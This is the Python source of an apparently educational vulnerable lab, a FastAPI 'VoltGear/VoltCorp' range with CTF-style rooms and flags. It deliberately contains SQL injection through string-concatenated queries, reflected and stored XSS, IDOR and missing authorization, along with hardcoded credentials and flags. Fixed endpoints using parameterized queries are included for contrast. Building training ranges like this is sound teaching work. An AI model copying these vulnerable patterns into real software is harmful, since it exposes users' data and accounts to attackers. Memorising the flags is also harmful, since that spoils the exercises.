"""
Vulnerable Target Application for Red Team Room 09: SQL Injection Fundamentals.
Simulates VoltGear Security Equipment Store with intentional vulnerabilities:
1. /search?q= - String concatenation UNION SQL injection
2. /login - String concatenation authentication bypass
3. /filter?category= - Numeric injection without string delimiters
4. /secure/login - Remediated endpoint using parameterized queries
5. /secure/search - Remediated search using prepared statements
"""

import hashlib
import hmac
import html
import os
import sqlite3
import time
from pathlib import Path
from typing import Any, Dict, List, Optional
from fastapi import FastAPI, Form, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

DB_PATH = Path(__file__).resolve().parent / "target_store.db"


def init_target_db():
    try:
        reset_target_in_memory_states()
    except Exception:
        pass
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    cursor.execute("DROP TABLE IF EXISTS users")
    cursor.execute("DROP TABLE IF EXISTS products")
    cursor.execute("DROP TABLE IF EXISTS hidden_flags")

    cursor.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            role TEXT NOT NULL,
            flag TEXT
        )
    """)

    cursor.execute("""
        CREATE TABLE products (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            description TEXT NOT NULL,
            price REAL NOT NULL,
            category_id INTEGER NOT NULL
        )
    """)

    cursor.execute("""
        CREATE TABLE hidden_flags (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            flag_name TEXT NOT NULL,
            flag_value TEXT NOT NULL,
            category TEXT NOT NULL
        )
    """)

    # Seed users
    cursor.execute(
        "INSERT INTO users (username, password, role, flag) VALUES (?, ?, ?, ?)",
        ("admin", "P@ssw0rd!#SecretAdmin99", "administrator", "NOENTRY{sqli_auth_bypass_success_3914}"),
    )
    cursor.execute(
        "INSERT INTO users (username, password, role, flag) VALUES (?, ?, ?, ?)",
        ("operator", "OperatorAccess2026!", "operator", ""),
    )

    # Seed products
    products = [
        ("VoltGear Tactical Router", "Hardened enterprise gigabit router with packet inspection.", 899.0, 1),
        ("Cyber Matrix Hardware Key", "FIDO2 / WebAuthn cryptographic hardware token.", 79.5, 2),
        ("GhostWire Network Tap", "Passive inline fiber and copper gigabit traffic tap.", 349.0, 1),
        ("Specter Faraday Shield Bag", "RF shielding enclosure for radio and mobile isolation.", 45.0, 3),
        ("Sentinel EDR Agent License", "Single endpoint detection and behavioral monitoring license.", 120.0, 2),
        ("BlackIce Heat Sink Enclosure", "Aluminum thermal management housing for field compute.", 59.0, 3),
        ("Nexus Protocol Analyzer", "Dedicated handheld network forensic packet capture device.", 1250.0, 1),
        ("VaultLock Secure USB 3.0", "Hardware encrypted 128GB flash drive with keypad.", 110.0, 2),
    ]
    cursor.executemany(
        "INSERT INTO products (name, description, price, category_id) VALUES (?, ?, ?, ?)",
        products,
    )

    # Seed hidden flags
    cursor.execute(
        "INSERT INTO hidden_flags (flag_name, flag_value, category) VALUES (?, ?, ?)",
        ("DATABASE_DUMP_VAULT", "NOENTRY{union_sqli_data_extraction_7129}", "confidential"),
    )
    cursor.execute(
        "INSERT INTO hidden_flags (flag_name, flag_value, category) VALUES (?, ?, ?)",
        ("NUMERIC_INJECTION_FLAG", "NOENTRY{sqli_numeric_challenge_pivot_8842}", "system_keys"),
    )

    conn.commit()
    conn.close()


# Initialize database upon module import
init_target_db()

target_app = FastAPI(
    title="VoltGear Security Equipment Store",
    description="Educational vulnerable application for SQL injection practice.",
    version="1.0.0",
)


@target_app.get("/", response_class=HTMLResponse)
def index_page():
    return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>VoltGear Tactical Equipment</title>
<style>
  body { background: #0c1017; color: #e0e6ed; font-family: monospace; margin: 0; padding: 20px; }
  header { border-bottom: 2px solid #00E5FF; padding-bottom: 10px; margin-bottom: 20px; }
  h1 { color: #00E5FF; margin: 0; }
  .card { background: #151b26; border: 1px solid #243044; padding: 15px; margin-bottom: 15px; border-radius: 4px; }
  .btn { background: #00E5FF; color: #000; font-weight: bold; border: none; padding: 8px 16px; cursor: pointer; }
  input[type="text"], input[type="password"] { background: #080c12; border: 1px solid #334460; color: #fff; padding: 8px; width: 280px; }
  table { width: 100%; border-collapse: collapse; margin-top: 15px; }
  th, td { border: 1px solid #243044; padding: 8px; text-align: left; }
  th { background: #1c2536; color: #00E5FF; }
  .badge { background: #FF1F3D; color: #fff; padding: 2px 6px; font-size: 11px; border-radius: 3px; }
</style>
</head>
<body>
<header>
  <h1>VOLTGEAR // TACTICAL CATALOG</h1>
  <p>Status: ONLINE // Target Port: 8089 // Range Node: 10.10.14.90</p>
</header>

<div class="card">
  <h3>PRODUCT SEARCH</h3>
  <form action="/search" method="get">
    <input type="text" name="q" placeholder="Search catalog (e.g. Router, Key)..." value="">
    <button class="btn" type="submit">SEARCH</button>
  </form>
</div>

<div class="card">
  <h3>PORTAL AUTHENTICATION</h3>
  <form action="/login" method="post">
    <div><label>User: </label><input type="text" name="username" placeholder="Username"></div>
    <div style="margin-top: 8px;"><label>Pass: </label><input type="password" name="password" placeholder="Password"></div>
    <div style="margin-top: 12px;"><button class="btn" type="submit">OPERATOR LOGIN</button></div>
  </form>
</div>

<div class="card">
  <h3>CATEGORY FILTER</h3>
  <p>Filter by Numeric ID: <a href="/filter?category=1" style="color:#00E5FF">Networking (1)</a> | <a href="/filter?category=2" style="color:#00E5FF">Cryptographic (2)</a> | <a href="/filter?category=3" style="color:#00E5FF">Hardware (3)</a></p>
</div>

<div class="card">
  <h3>SECURE REFERENCE ENDPOINTS</h3>
  <p>Remediated endpoints using prepared statements: <code>/secure/login</code> and <code>/secure/search?q=</code></p>
</div>
</body>
</html>
"""


# ----------------------------------------------------------------------------
# 1. VULNERABLE SEARCH (UNION-based SQLi)
# ----------------------------------------------------------------------------
@target_app.get("/search")
def search_products(q: str = Query(default="")):
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    # INTENTIONAL VULNERABILITY: Raw string concatenation into SQL query
    raw_query = f"SELECT id, name, description, price FROM products WHERE name LIKE '%{q}%'"

    try:
        cursor.execute(raw_query)
        rows = cursor.fetchall()
        results = [
            {"id": r[0], "name": str(r[1]), "description": str(r[2]), "price": r[3]}
            for r in rows
        ]
        conn.close()
        return {
            "status": "success",
            "query_executed": raw_query,
            "count": len(results),
            "results": results,
        }
    except Exception as exc:
        conn.close()
        return JSONResponse(
            status_code=500,
            content={
                "status": "error",
                "error_type": "SQL_SYNTAX_ERROR",
                "detail": str(exc),
                "query_executed": raw_query,
            },
        )


# ----------------------------------------------------------------------------
# 2. VULNERABLE LOGIN (Authentication Bypass SQLi)
# ----------------------------------------------------------------------------
class LoginRequest(BaseModel):
    username: str
    password: str


@target_app.post("/login")
def login(username: str = Form(default=""), password: str = Form(default="")):
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    # INTENTIONAL VULNERABILITY: Raw string interpolation in authentication query
    raw_query = f"SELECT id, username, role, flag FROM users WHERE username = '{username}' AND password = '{password}'"

    try:
        cursor.execute(raw_query)
        user_row = cursor.fetchone()
        conn.close()

        if user_row:
            user_id, uname, role, flag = user_row
            return {
                "authenticated": True,
                "user": uname,
                "role": role,
                "message": f"Welcome back, {uname}! Administrator access granted.",
                "flag": flag if role == "administrator" else "No flag for non-admin user.",
                "query_executed": raw_query,
            }
        else:
            return JSONResponse(
                status_code=401,
                content={
                    "authenticated": False,
                    "message": "Invalid credentials provided.",
                    "query_executed": raw_query,
                },
            )
    except Exception as exc:
        conn.close()
        return JSONResponse(
            status_code=500,
            content={
                "status": "error",
                "error_type": "SQL_SYNTAX_ERROR",
                "detail": str(exc),
                "query_executed": raw_query,
            },
        )


# ----------------------------------------------------------------------------
# 3. VULNERABLE NUMERIC FILTER (Independent Challenge SQLi)
# ----------------------------------------------------------------------------
@target_app.get("/filter")
def filter_by_category(category: str = Query(default="1")):
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    # INTENTIONAL VULNERABILITY: Raw numeric concatenation without quote delimiters
    raw_query = f"SELECT id, name, description, price FROM products WHERE category_id = {category}"

    try:
        cursor.execute(raw_query)
        rows = cursor.fetchall()
        results = [
            {"id": r[0], "name": str(r[1]), "description": str(r[2]), "price": r[3]}
            for r in rows
        ]
        conn.close()
        return {
            "status": "success",
            "category_param": category,
            "query_executed": raw_query,
            "count": len(results),
            "results": results,
        }
    except Exception as exc:
        conn.close()
        return JSONResponse(
            status_code=500,
            content={
                "status": "error",
                "error_type": "SQL_SYNTAX_ERROR",
                "detail": str(exc),
                "query_executed": raw_query,
            },
        )


# ----------------------------------------------------------------------------
# 4. REMEDIATED SECURE LOGIN (Parameterized Queries)
# ----------------------------------------------------------------------------
@target_app.post("/secure/login")
def secure_login(username: str = Form(default=""), password: str = Form(default="")):
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    # REMEDIATED: Parameters are bound via DB driver, preventing command injection
    safe_query = "SELECT id, username, role, flag FROM users WHERE username = ? AND password = ?"

    cursor.execute(safe_query, (username, password))
    user_row = cursor.fetchone()
    conn.close()

    if user_row:
        user_id, uname, role, flag = user_row
        return {
            "authenticated": True,
            "user": uname,
            "role": role,
            "flag": flag,
            "remediation": "Parameterized prepared statement used. Injection payloads treated purely as literal string.",
        }
    return JSONResponse(
        status_code=401,
        content={
            "authenticated": False,
            "message": "Authentication failed. Parameterized query safely treated payload as literal text.",
            "remediation": "SECURE: Syntax injection rejected.",
        },
    )


# ----------------------------------------------------------------------------
# 5. REMEDIATED SECURE SEARCH
# ----------------------------------------------------------------------------
@target_app.get("/secure/search")
def secure_search(q: str = Query(default="")):
    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    safe_query = "SELECT id, name, description, price FROM products WHERE name LIKE ?"
    cursor.execute(safe_query, (f"%{q}%",))
    rows = cursor.fetchall()
    conn.close()

    results = [
        {"id": r[0], "name": str(r[1]), "description": str(r[2]), "price": r[3]}
        for r in rows
    ]
    return {
        "status": "success",
        "count": len(results),
        "results": results,
        "remediation": "Parameterized query active.",
    }


# ============================================================================
# ROOM 01: FOUNDATIONS ASSET AUDIT SERVICE (PORT 8081)
# ============================================================================

foundations_app = FastAPI(title="VoltCorp Asset Inventory Service")


@foundations_app.get("/audit")
def foundations_audit():
    return {
        "status": "AUDIT_COMPLETE",
        "service": "VoltCorp Internal Asset Inventory System",
        "unauthenticated": True,
        "assets": ["customer_records.db", "backup_codes.txt"],
        "security_finding": "Critical Integrity Violation: Database permissions world-writable (666)",
        "flag": "NOENTRY{cia_triad_integrity_breach_1042}",
    }


@foundations_app.get("/status")
def foundations_status():
    return {"status": "ONLINE", "port": 8081, "auth": "NONE"}


@foundations_app.get("/")
def foundations_root():
    return HTMLResponse("<h2>VoltCorp Asset Inventory Portal</h2><p>Unauthenticated inspection active on /audit</p>")


# ============================================================================
# ROOM 03: NETWORKING FUNDAMENTALS HTTP SERVICE (PORT 8080)
# ============================================================================

network_app = FastAPI(title="VoltCorp Network Diagnostic Gateway")


@network_app.get("/status")
def network_status():
    return {"status": "ONLINE", "host": "target.noentry.internal", "ip": "10.10.14.90", "port": 8080}


@network_app.get("/network-info")
def network_info():
    return {
        "status": "OK",
        "host": "target.noentry.internal",
        "ip": "10.10.14.90",
        "subnet": "10.10.14.0/24",
        "gateway": "10.10.14.1",
        "protocol": "HTTP/1.1",
        "transport": "TCP",
        "flag": "NOENTRY{net_http_client_server_4419}",
    }


@network_app.get("/")
def network_root():
    return {"service": "Network Diagnostic Gateway", "endpoints": ["/status", "/network-info"]}


# ============================================================================
# ROOM 04: RECONNAISSANCE TARGET APPLICATION (PORT 8090)
# ============================================================================

recon_app = FastAPI(title="VoltCorp Web Infrastructure")


@recon_app.middleware("http")
async def add_custom_recon_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Backend-Server"] = "VoltCore-v2.14-Internal"
    return response


@recon_app.api_route("/", methods=["GET", "HEAD"])
def recon_root():
    return HTMLResponse(
        "<html><head><title>VoltCorp Systems</title></head>"
        "<body><h1>VoltCorp Enterprise Systems</h1><p>Active web infrastructure portal.</p></body></html>"
    )


@recon_app.get("/robots.txt", response_class=HTMLResponse)
def recon_robots():
    content = "User-agent: *\nDisallow: /admin-portal-staging-7712/\nDisallow: /secret-assets/\n"
    return HTMLResponse(content=content, media_type="text/plain")


@recon_app.get("/admin-portal-staging-7712/")
def recon_staging():
    return {
        "portal": "Staging Administrative Gateway",
        "status": "EXPOSED_UNAUTHENTICATED",
        "disclosed_by": "robots.txt",
        "flag": "NOENTRY{recon_robots_hidden_endpoint_2901}",
    }


@recon_app.get("/api/v1/health")
def recon_health():
    return {
        "status": "HEALTHY",
        "version": "2.14",
        "docs": "/api/v1/internal-docs",
    }


@recon_app.get("/api/v1/internal-docs")
def recon_docs():
    return {
        "documentation": "VoltCorp Internal Microservices API",
        "endpoints": [
            "/api/v1/health",
            "/api/v1/users",
            "/api/v1/telemetry",
        ],
        "api_flag": "NOENTRY{recon_api_metadata_harvest_6310}",
    }


@recon_app.get("/secret-assets/database_credentials.bak")
def recon_secret_bak():
    content = (
        "# VOLTCORP DATABASE BACKUP CONFIGURATION\n"
        "# DUMP DATE: 2026-11-14\n"
        "DB_USER=volt_admin\n"
        "DB_HASH=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918\n"
        "SECRET_FLAG=NOENTRY{recon_dir_enumeration_master_9044}\n"
    )
    return HTMLResponse(content=content, media_type="text/plain")


# ============================================================================
# ROOM 05: NETWORK SCANNING TARGET (PORT 8085)
# ============================================================================

scanning_app = FastAPI(title="VoltCorp Network Scanning Target")


@scanning_app.api_route("/", methods=["GET", "HEAD"])
def scanning_root():
    return {
        "service": "VoltCorp Network Scanning Target",
        "host": "target.noentry.internal",
        "ip": "10.10.14.90",
        "port": 8085,
        "status": "ONLINE",
    }


@scanning_app.get("/scan-status")
def scanning_status():
    return {
        "status": "PORT_OPEN",
        "port": 8085,
        "protocol": "TCP",
        "service": "HTTP/1.1",
        "flag": "NOENTRY{nmap_port_discovery_open_4812}",
    }


@scanning_app.get("/challenge")
def scanning_challenge():
    return {
        "status": "STEALTH_SCAN_SUCCESS",
        "finding": "Full network sweep verified. Host discovery and port triage complete.",
        "flag": "NOENTRY{net_scan_stealth_recon_7731}",
    }


# ============================================================================
# ROOM 06: SERVICE ENUMERATION (PORTS 2121, 2222, 8086)
# ============================================================================

async def handle_ftp_client(reader, writer):
    banner = (
        b"220-VoltCorp Embedded Secure FTP Server v1.4.2 ready.\r\n"
        b"220-Notice: All connections logged and monitored.\r\n"
        b"220 Flag: NOENTRY{ftp_banner_service_enumeration_5921}\r\n"
    )
    writer.write(banner)
    await writer.drain()
    writer.close()
    await writer.wait_closed()


async def handle_ssh_client(reader, writer):
    banner = b"SSH-2.0-OpenSSH_8.4p1-VoltCorp_Secure_Gateway_v2\r\n"
    writer.write(banner)
    await writer.drain()
    writer.close()
    await writer.wait_closed()


enum_app = FastAPI(title="VoltCorp Service Enumeration API")


@enum_app.middleware("http")
async def add_enum_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Service-Catalog"] = "VoltCore-Enum-v3.1"
    return response


@enum_app.api_route("/", methods=["GET", "HEAD"])
def enum_root():
    return {
        "service": "VoltCorp Service Catalog API",
        "version": "3.1",
        "endpoints": ["/api/v1/services", "/admin-internal/"],
    }


@enum_app.get("/api/v1/services")
def enum_services():
    return {
        "active_services": [
            {"port": 2121, "name": "ftp", "banner": "VoltCorp FTP v1.4.2"},
            {"port": 2222, "name": "ssh", "banner": "OpenSSH_8.4p1"},
            {"port": 8086, "name": "http-enum", "banner": "VoltCore-Enum-v3.1"},
        ]
    }


@enum_app.get("/admin-internal/")
def enum_admin_internal():
    return {
        "catalog": "Internal Administrative Services",
        "status": "ENUMERATION_CONFIRMED",
        "flag": "NOENTRY{service_enumeration_master_3389}",
    }


# ============================================================================
# ROOM 07: VULNERABILITY ASSESSMENT (PORT 8087)
# ============================================================================

vuln_app = FastAPI(title="VoltCorp Vulnerability Assessment System")
_REMEDIATION_STATE = {"remediated": False}


@vuln_app.api_route("/", methods=["GET", "HEAD"])
def vuln_root():
    return {
        "service": "VoltCorp Vulnerability Assessment Gateway",
        "endpoints": ["/api/components", "/audit/report", "/audit/remediate"],
    }


@vuln_app.get("/api/components")
def vuln_components():
    return [
        {
            "name": "VoltCore HTTP Engine",
            "version": "2.14.0-legacy",
            "status": "VULNERABLE",
            "cve": "CVE-2023-9182",
        },
        {
            "name": "VoltAuth Module",
            "version": "1.1.0" if _REMEDIATION_STATE["remediated"] else "1.0.2",
            "status": "PATCHED" if _REMEDIATION_STATE["remediated"] else "VULNERABLE",
            "cve": "CVE-2024-2104",
        },
    ]


@vuln_app.get("/audit/report")
def vuln_report():
    return {
        "audit_id": "VA-2026-9041",
        "target": "10.10.14.90",
        "critical_vulnerabilities": ["CVE-2024-2104 (CVSS: 9.8)"],
        "high_vulnerabilities": ["CVE-2023-9182 (CVSS: 8.6)"],
        "assessment_status": "VULNERABILITY_CONFIRMED",
        "flag": "NOENTRY{cve_vulnerability_assessment_master_8192}",
    }


@vuln_app.post("/audit/remediate")
async def vuln_remediate(request: Request):
    content_type = request.headers.get("content-type", "")
    cve = ""
    if "json" in content_type:
        try:
            body = await request.json()
            cve = body.get("cve", "")
        except Exception:
            pass
    else:
        try:
            form = await request.form()
            cve = form.get("cve", "")
        except Exception:
            pass

    _REMEDIATION_STATE["remediated"] = True
    return {
        "status": "PATCH_APPLIED",
        "cve": cve or "CVE-2024-2104",
        "component": "VoltAuth Module",
        "new_version": "1.1.0",
        "verification": "VERIFIED_SECURE",
        "flag": "NOENTRY{vuln_assessment_remediation_verified_9410}",
    }


# ============================================================================
# ROOM 08: WEB APPLICATION FUNDAMENTALS (PORT 8088)
# ============================================================================

webapp_app = FastAPI(title="VoltCommerce Web Application")


@webapp_app.api_route("/", methods=["GET", "HEAD"])
def webapp_root():
    return HTMLResponse(
        "<html><head><title>VoltCommerce Store API</title></head>"
        "<body><h1>VoltCommerce Web Gateway</h1>"
        "<p>Endpoints: /api/auth/login, /api/profile, /api/items/{id}</p>"
        "</body></html>"
    )


@webapp_app.post("/api/auth/login")
async def webapp_login(request: Request):
    username = ""
    password = ""
    content_type = request.headers.get("content-type", "")
    if "json" in content_type:
        try:
            body = await request.json()
            username = body.get("username", "")
            password = body.get("password", "")
        except Exception:
            pass
    else:
        try:
            form = await request.form()
            username = form.get("username", "")
            password = form.get("password", "")
        except Exception:
            pass

    if username == "operator" and password == "voltpass123":
        resp = JSONResponse(
            content={
                "status": "AUTHENTICATED",
                "session_token": "op_sess_88291a",
                "message": "Session established. Use cookie session_id=op_sess_88291a to authenticate.",
            }
        )
        resp.set_cookie(key="session_id", value="op_sess_88291a", httponly=True)
        return resp
    return JSONResponse(status_code=401, content={"error": "Invalid username or password"})


@webapp_app.get("/api/profile")
def webapp_profile(request: Request):
    cookie_sess = request.cookies.get("session_id")
    auth_header = request.headers.get("authorization", "")
    if cookie_sess == "op_sess_88291a" or "op_sess_88291a" in auth_header:
        return {
            "status": "OK",
            "user": "operator",
            "role": "Security Analyst",
            "session": "op_sess_88291a",
            "flag": "NOENTRY{web_session_cookie_auth_2841}",
        }
    return JSONResponse(status_code=401, content={"error": "Authentication required. Missing valid session cookie."})


@webapp_app.put("/api/items/{item_id}")
async def webapp_update_item(item_id: int, request: Request):
    return {
        "status": "UPDATED",
        "item_id": item_id,
        "method": "PUT",
        "action": "Resource replaced successfully",
        "flag": "NOENTRY{web_http_put_method_master_7109}",
    }


@webapp_app.delete("/api/profile")
def webapp_delete_profile():
    return JSONResponse(status_code=405, content={"detail": "Method Not Allowed"})


@webapp_app.get("/api/debug/headers")
def webapp_debug_headers(request: Request):
    return {"headers": dict(request.headers)}


# ============================================================================
# ROOM 10: CROSS-SITE SCRIPTING (PORT 8091)
# ============================================================================

xss_app = FastAPI(title="VoltCorp Community & Search Portal")
_XSS_STATE = {
    "remediated": False,
    "comments": [
        {"author": "System", "comment": "Welcome to VoltCorp Community Portal."},
        {"author": "Security Team", "comment": "Please report all security vulnerabilities responsibly."},
    ],
}


@xss_app.get("/")
def xss_root():
    return HTMLResponse(
        "<html><head><title>VoltCorp Community Portal</title></head>"
        "<body><h1>VoltCorp Search & Discussion</h1>"
        "<p>Endpoints: /reflected?q=QUERY, /comments, /challenge, /remediate</p>"
        "</body></html>"
    )


@xss_app.get("/reflected")
def xss_reflected(q: str = "", format: str = "", request: Request = None):
    is_safe = _XSS_STATE["remediated"]
    has_script = any(sig in q.lower() for sig in ["<script>", "<img", "onerror", "onload", "alert(", "javascript:"])
    flag = "NOENTRY{xss_reflected_script_execution_4821}" if (has_script and not is_safe) else None

    if is_safe:
        rendered = html.escape(q)
        headers = {"Content-Security-Policy": "default-src 'self'"}
        accept_hdr = request.headers.get("accept", "") if request else ""
        if format == "json" or "application/json" in accept_hdr:
            return JSONResponse({"status": "SECURE", "escaped_query": rendered}, headers=headers)
        return HTMLResponse(
            f"<html><head><title>Search Results</title></head><body>"
            f"<h2>Search Results</h2><p>Query: {rendered}</p>"
            f"</body></html>",
            headers=headers,
        )
    else:
        rendered = q
        accept_hdr = request.headers.get("accept", "") if request else ""
        if format == "json" or "application/json" in accept_hdr:
            resp_data = {"status": "VULNERABLE", "query": rendered}
            if flag:
                resp_data["flag"] = flag
            return JSONResponse(resp_data)

        flag_markup = f'<div id="xss-proof" data-flag="{flag}">XSS EXECUTED: {flag}</div>' if flag else ""
        return HTMLResponse(
            f"<html><head><title>Search Results</title></head><body>"
            f"<h2>Search Results</h2><p>Query: {rendered}</p>"
            f"{flag_markup}"
            f"</body></html>"
        )


@xss_app.get("/comments")
def xss_get_comments():
    is_safe = _XSS_STATE["remediated"]
    if is_safe:
        safe_comments = [
            {"author": html.escape(c["author"]), "comment": html.escape(c["comment"])}
            for c in _XSS_STATE["comments"]
        ]
        return JSONResponse({"comments": safe_comments, "status": "SECURE", "encoding": "HTML_ESCAPED"})
    return JSONResponse({"comments": _XSS_STATE["comments"], "status": "RAW_STORED"})


@xss_app.post("/comments")
async def xss_post_comment(request: Request):
    author = "anonymous"
    comment = ""
    ct = request.headers.get("content-type", "")
    if "json" in ct:
        data = await request.json()
        author = data.get("author", author)
        comment = data.get("comment", "")
    else:
        form = await request.form()
        author = form.get("author", author)
        comment = form.get("comment", "")

    _XSS_STATE["comments"].append({"author": author, "comment": comment})
    has_script = any(sig in comment.lower() for sig in ["<script>", "<img", "onerror", "onload", "alert(", "javascript:"])

    if has_script and not _XSS_STATE["remediated"]:
        return JSONResponse({
            "status": "STORED",
            "message": "Comment stored successfully",
            "flag": "NOENTRY{xss_stored_comment_payload_9104}",
        })
    return JSONResponse({"status": "STORED", "message": "Comment posted"})


@xss_app.get("/challenge")
def xss_challenge(theme: str = ""):
    if '"' in theme and any(x in theme.lower() for x in ["onmouseover", "onclick", "onerror", "alert("]):
        return JSONResponse({
            "status": "ATTRIBUTE_INJECTION_CONFIRMED",
            "flag": "NOENTRY{xss_context_encoding_defense_6623}",
        })
    return JSONResponse({"status": "ACTIVE", "hint": "Inject attribute delimiter to escape attribute context"})


@xss_app.post("/remediate")
def xss_remediate():
    _XSS_STATE["remediated"] = True
    return JSONResponse({
        "status": "REMEDIATED",
        "remediation": "Context-aware HTML escaping and Content-Security-Policy enabled",
        "flag": "NOENTRY{xss_output_encoding_remediation_7812}",
    })


# ============================================================================
# ROOM 11: AUTHENTICATION ATTACKS (PORT 8092)
# ============================================================================

auth_app = FastAPI(title="VoltCorp Secure Authentication Portal")
_AUTH_STATE = {
    "remediated": False,
    "failed_attempts": {},
    "logs": [
        {"timestamp": "2026-11-14T08:00:01Z", "ip": "10.10.14.2", "username": "admin", "status": "FAILED"},
        {"timestamp": "2026-11-14T08:00:03Z", "ip": "10.10.14.2", "username": "admin", "status": "FAILED"},
        {"timestamp": "2026-11-14T08:00:05Z", "ip": "10.10.14.2", "username": "guest", "status": "FAILED"},
    ],
}


@auth_app.get("/")
def auth_root():
    return HTMLResponse(
        "<html><head><title>VoltCorp Authentication Gateway</title></head>"
        "<body><h1>VoltCorp Auth Portal</h1>"
        "<p>Endpoints: /api/login, /api/logs, /challenge, /api/remediate</p>"
        "</body></html>"
    )


@auth_app.post("/api/login")
async def auth_login(request: Request):
    username = ""
    password = ""
    ct = request.headers.get("content-type", "")
    if "json" in ct:
        data = await request.json()
        username = data.get("username", "")
        password = data.get("password", "")
    else:
        form = await request.form()
        username = form.get("username", "")
        password = form.get("password", "")

    client_ip = request.client.host if request.client else "10.10.14.2"

    if _AUTH_STATE["remediated"]:
        attempts = _AUTH_STATE["failed_attempts"].get(client_ip, 0)
        if attempts >= 3:
            return JSONResponse(
                status_code=429,
                content={"status": "LOCKED", "detail": "Too many failed attempts. Rate limit exceeded."},
                headers={"Retry-After": "60"},
            )

    _AUTH_STATE["logs"].append({
        "timestamp": "2026-11-14T10:15:00Z",
        "ip": client_ip,
        "username": username,
        "status": "SUCCESS" if (username == "support" and password == "voltcorp2024") else "FAILED",
    })

    if username == "support" and password == "voltcorp2024":
        _AUTH_STATE["failed_attempts"][client_ip] = 0
        return JSONResponse({
            "status": "AUTHENTICATED",
            "user": "support",
            "session_token": "supp_sess_77192",
            "flag": "NOENTRY{auth_brute_force_dictionary_7190}",
        })

    _AUTH_STATE["failed_attempts"][client_ip] = _AUTH_STATE["failed_attempts"].get(client_ip, 0) + 1
    return JSONResponse(status_code=401, content={"status": "UNAUTHORIZED", "detail": "Invalid credentials"})


@auth_app.get("/api/logs")
def auth_logs():
    return JSONResponse({
        "status": "TELEMETRY_LOGS",
        "logs": _AUTH_STATE["logs"],
        "flag": "NOENTRY{auth_log_analysis_telemetry_3481}",
    })


@auth_app.get("/challenge")
def auth_challenge(action: str = ""):
    if action == "verify_policy":
        return JSONResponse({
            "status": "LOCKOUT_POLICY_VERIFIED",
            "lockout_threshold": 3,
            "hash_algorithm": "bcrypt",
            "flag": "NOENTRY{auth_lockout_policy_defense_5514}",
        })
    return JSONResponse({"status": "ACTIVE", "hint": "Query with action=verify_policy"})


@auth_app.post("/api/remediate")
def auth_remediate():
    _AUTH_STATE["remediated"] = True
    return JSONResponse({
        "status": "REMEDIATED",
        "protections": "Bcrypt password hashing with salt + Rate limiting (3 max attempts / lockout)",
        "flag": "NOENTRY{auth_rate_limiting_bcrypt_hardened_9205}",
    })


# ============================================================================
# ROOM 12: ACCESS CONTROL TESTING (PORT 8093)
# ============================================================================

access_app = FastAPI(title="VoltCorp Access Control Portal")
_ACCESS_STATE = {"remediated": False}

_DOCUMENTS_DB = {
    101: {
        "id": 101,
        "owner_id": 101,
        "owner_name": "alice",
        "title": "Alice Q3 Executive Financial Audit",
        "classification": "CONFIDENTIAL",
        "content": "VoltCorp Q3 Earnings: $4.2M net profit. Projected acquisition targets enclosed.",
    },
    102: {
        "id": 102,
        "owner_id": 102,
        "owner_name": "bob",
        "title": "Bob Public Engineering Notes",
        "classification": "INTERNAL",
        "content": "Sprint roadmap and sprint retrospective items.",
    },
}

_USERS_DB = [
    {"id": 101, "username": "alice", "role": "user", "email": "alice@voltcorp.internal"},
    {"id": 102, "username": "bob", "role": "user", "email": "bob@voltcorp.internal"},
    {"id": 999, "username": "admin", "role": "admin", "email": "secadmin@voltcorp.internal"},
]


def _resolve_session_user(request: Request):
    auth_header = request.headers.get("authorization", "")
    token = ""
    if "bearer" in auth_header.lower():
        token = auth_header.split()[-1]
    if not token:
        token = request.query_params.get("token", "")

    if token == "bob_token":
        return {"id": 102, "username": "bob", "role": "user"}
    if token == "alice_token":
        return {"id": 101, "username": "alice", "role": "user"}
    if token == "admin_token":
        return {"id": 999, "username": "admin", "role": "admin"}
    return {"id": 102, "username": "bob", "role": "user"}


@access_app.get("/")
def access_root():
    return HTMLResponse(
        "<html><head><title>VoltCorp Document Management</title></head>"
        "<body><h1>VoltCorp Document Gateway</h1>"
        "<p>Endpoints: /api/documents/{id}, /api/admin/users, /challenge, /api/remediate</p>"
        "</body></html>"
    )


@access_app.get("/api/documents/{doc_id}")
def access_get_document(doc_id: int, request: Request):
    user = _resolve_session_user(request)
    doc = _DOCUMENTS_DB.get(doc_id)
    if not doc:
        return JSONResponse(status_code=404, content={"detail": "Document not found"})

    if _ACCESS_STATE["remediated"]:
        if doc["owner_id"] != user["id"] and user["role"] != "admin":
            return JSONResponse(status_code=403, content={"detail": "Access denied: Object ownership validation failed"})
        return JSONResponse({"document": doc, "status": "AUTHORIZED"})
    else:
        flag = "NOENTRY{idor_horizontal_privilege_access_8321}" if (doc_id == 101 and user["id"] != 101) else None
        resp = {"document": doc, "status": "UNVALIDATED_ACCESS"}
        if flag:
            resp["flag"] = flag
            resp["warning"] = "IDOR: Retrieved document without server-side ownership validation"
        return JSONResponse(resp)


@access_app.get("/api/admin/users")
def access_admin_users(request: Request):
    user = _resolve_session_user(request)
    if _ACCESS_STATE["remediated"]:
        if user["role"] != "admin":
            return JSONResponse(status_code=403, content={"detail": "Access denied: Administrative privileges required"})
        return JSONResponse({"users": _USERS_DB, "status": "AUTHORIZED_ADMIN"})
    else:
        return JSONResponse({
            "users": _USERS_DB,
            "status": "VERTICAL_PRIVILEGE_VIOLATION",
            "flag": "NOENTRY{vertical_privilege_escalation_breach_4490}",
        })


@access_app.get("/challenge")
def access_challenge(account_id: int = 0):
    if account_id == 101:
        return JSONResponse({
            "status": "BOLA_PARAMETER_TAMPERING_CONFIRMED",
            "flag": "NOENTRY{bola_access_control_master_2951}",
        })
    return JSONResponse({"status": "ACTIVE", "hint": "Tamper with account_id parameter"})


